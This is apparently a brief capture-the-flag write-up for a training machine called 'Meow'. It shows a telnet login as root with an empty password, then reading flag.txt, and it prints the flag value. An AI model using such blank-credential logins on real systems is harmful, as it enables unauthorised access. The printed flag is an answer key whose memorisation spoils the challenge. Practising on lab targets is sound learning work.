port 23 is open

we tried to enter using `root` as user and empty password as password 

```bash
telnet 10.129.1.17
Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 05 Mar 2023 10:34:46 PM UTC

  System load:           0.04
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             138
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.17
  IPv6 address for eth0: dead:beef::250:56ff:fe96:2ddd

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Mar  5 22:34:07 UTC 2023 on pts/0
root@Meow:~#
```
once in the box it's easy to navigate and catpure the flag
```bash
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```
